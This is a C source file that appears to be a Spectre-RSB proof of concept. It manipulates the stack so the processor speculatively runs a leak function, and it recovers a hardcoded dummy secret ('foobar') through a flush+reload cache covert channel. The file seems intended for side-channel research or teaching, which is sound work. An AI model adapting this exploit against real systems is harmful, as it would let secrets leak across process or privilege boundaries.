#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include "../sidechannel/flush_reload.h"


#define CACHE_MISS 80
#define PAGESIZE 4096
#define SECRET "foobar"
#define TRIES 10
char* channel;


// Pop return address from the software stack, causing misspeculation when hitting the return
int __attribute__ ((noinline)) call_manipulate_stack() {
  register uintptr_t sp asm ("sp"); // additionally, flush stack pointer to enlarge execution window
#if defined(__i386__) || defined(__x86_64__)
  asm volatile("pop %%rax\n" : : : "rax");
  _mm_clflush(sp);
#elif defined(__aarch64__)
  asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
#endif
  return 0;
}

int __attribute__ ((noinline)) call_leak(char s) {
  // Manipulate the stack so that we don't return here, but to call_start
  call_manipulate_stack();
  // architecturally, this is never executed
  // Encode data in covert channel
  maccess(channel + s * PAGESIZE);
  return 2;
}

int __attribute__ ((noinline)) call_start(char s) {
  call_leak(s);
  //_mm_mfence(); // improves execution cycle count in gem5, but decreases accuracy natively
  return 1;
}

void confuse_compiler() {
  // this function -- although never called -- is required
  // otherwise, the compiler replaces the calls with jumps
  char s = 'A';

  call_start(s);
  call_leak(s);
  call_manipulate_stack();

}

int main(int argc, const char **argv) {
  // Detect cache threshold
  char* secret = SECRET;
  size_t secret_size = sizeof(SECRET) - 1;

  char cc;
  int results[256]; // ! use a heap instead for performance?
  int i, j,k;

  channel = malloc(256 * PAGESIZE);
  memset(channel, 1, 256*PAGESIZE);
  flush(channel, PAGESIZE);


  _mm_mfence();
  
  for (int p =0; p < secret_size; p++) {
    _mm_mfence();
    // for every byte in the string
    for (i = 0; i < 256; i++) {
      results[i] = 0;
    }    

    cc = secret[p % secret_size]; // precomputation of character to extract

    for (int q = 0; q < TRIES; q++){
      _mm_mfence();
      call_start(cc);
      _mm_mfence();

      // Recover data from covert channel
      probe(channel,CACHE_MISS, PAGESIZE, results);
    }

    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    printf("%c\n", j);
  }
  free(channel);

  return (0);
}
